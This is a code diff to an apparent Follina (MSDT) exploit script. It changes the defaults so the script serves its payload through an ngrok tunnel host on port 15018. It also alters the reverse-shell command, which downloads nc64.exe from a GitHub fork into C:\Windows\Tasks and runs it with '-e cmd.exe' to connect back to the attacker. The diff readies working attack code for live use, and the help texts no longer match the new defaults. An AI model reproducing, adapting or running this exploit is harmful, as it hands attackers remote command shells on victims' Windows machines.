@@ -34,7 +34,7 @@ parser.add_argument(
 parser.add_argument(
     "--interface",
     "-i",
-    default="eth0",
+    default="0.tcp.ap.ngrok.io",
     help="network interface or IP address to host the HTTP server (default: eth0)",
 )
 
@@ -42,7 +42,7 @@ parser.add_argument(
     "--port",
     "-p",
     type=int,
-    default="8000",
+    default="15018",
     help="port to serve the HTTP server (default: 8000)",
 )
 
@@ -50,7 +50,7 @@ parser.add_argument(
     "--reverse",
     "-r",
     type=int,
-    default="0",
+    default="15018",
     help="port to serve reverse shell on",
 )
 
@@ -108,7 +108,7 @@ def main(args):
 
     command = args.command
     if args.reverse:
-        command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
+        command = f"""Invoke-WebRequest https://github.com/cihuuy/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
 
     # Base64 encode our command so whitespace is respected
     base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")
